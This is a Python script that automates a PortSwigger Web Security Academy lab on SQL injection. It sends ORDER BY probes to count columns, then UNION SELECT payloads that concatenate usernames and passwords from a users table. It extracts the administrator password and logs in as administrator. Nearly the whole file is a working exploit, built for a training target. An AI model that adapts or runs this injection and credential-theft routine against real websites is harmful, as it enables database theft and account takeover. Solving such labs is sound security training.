import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection UNION attack, retrieving multiple values in a single column')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

COLUMNS = 0
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = { 'Cookie': f'session={r.cookies.get("session")}' }

for i in range(5, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='ORDER BY {i}-- ")
    print(f"Checking if table has {i} columns.")
    if not "Internal Server Error" in r.text:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

# GENERATE DIAGONAL MATRIX WITH STRINGS
matrix = [["NULL"]*COLUMNS for _ in range(COLUMNS)]
for i in range(COLUMNS):
        matrix[i][i] = "'|' || username || '|' || password || '|'"

# BRUTEFORCE COLUMNS CONTAINING STRINGS AND RETRIEVE CREDENTIALS (INTEL ABOUT DB GATHERED BY LAB DESCRIPTION)
for i in range(COLUMNS):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]} FROM users-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL").replace('"',''))
    if r.status_code == 200:
        print(f"Column {i+1} holds string values:\nhttps://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]} FROM users-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL").replace('"',''))
        password = re.findall(r'\|administrator\|([^|]+)\|', r.text)[0]
        print(f"|administrator|{password}|")
        # LOGIN AS ADMINISTRATOR
        data = {
            'csrf': f'{csrf}',
            'username': 'administrator',
            'password': f'{password}'
            }
        requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")

